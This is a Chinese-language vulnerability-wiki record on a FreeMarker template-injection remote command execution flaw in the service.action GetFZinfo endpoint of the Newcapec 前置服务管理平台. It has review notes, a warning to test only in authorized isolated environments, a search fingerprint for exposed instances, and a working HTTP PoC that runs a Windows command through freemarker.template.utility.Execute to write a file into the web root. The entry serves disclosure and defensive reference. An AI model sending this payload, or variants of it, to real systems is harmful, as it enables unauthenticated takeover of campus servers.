---
source: "Threekiii/Vulnerability-Wiki"
title: "新开普前置服务管理平台 service.action GetFZinfo UnitCode FreeMarker注入"
product: "新开普前置服务管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows cmd/Tomcat ROOT目录，版本未知"
prerequisites: "无Cookie请求，身份要求未知"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%96%B0%E5%BC%80%E6%99%AE/%E6%96%B0%E5%BC%80%E6%99%AE-%E5%89%8D%E7%BD%AE%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-service.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
id: "vw-fc922bfa29e88fec02362ff4"
entity_id: "ve-fc922bfa29e88fec02362ff4"
schema_version: "1"
---

# 新开普前置服务管理平台 service.action GetFZinfo UnitCode FreeMarker注入

## 条目说明

- 对象与具体问题：新开普前置服务管理平台；service.action GetFZinfo UnitCode FreeMarker注入
- 版本、配置及部署条件：Windows cmd/Tomcat ROOT目录，版本未知
- 认证与权限前提：无Cookie请求，身份要求未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FreeMarker Execute构造与命令写Test.txt文本可审，需具体模板配置/类解析权限
- 写文件有覆盖/残留风险，无清理；执行结果仅截图未视检
- 前置服务平台与掌上校园登录标题关系应核产品组件，不按title直接归全校系统
- 补版本/补丁/响应文本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限

### 漏洞影响

新开普 前置服务管理平台

### 网络测绘

```
title="掌上校园服务管理平台"
```

### 漏洞复现

登陆页面

![image-20230828112934396](./.resource/新开普-前置服务管理平台-service.action-远程命令执行漏洞/media/image-20230828112934396.png)

验证POC

```http
POST /service_transport/service.action HTTP/1.1
Host: 
Accept: */*
Content-Type: application/json

{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo Test > ./webapps/ROOT/Test.txt\")}"}
```

![image-20230828112953699](./.resource/新开普-前置服务管理平台-service.action-远程命令执行漏洞/media/image-20230828112953699.png)

![image-20230828113009271](./.resource/新开普-前置服务管理平台-service.action-远程命令执行漏洞/media/image-20230828113009271.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
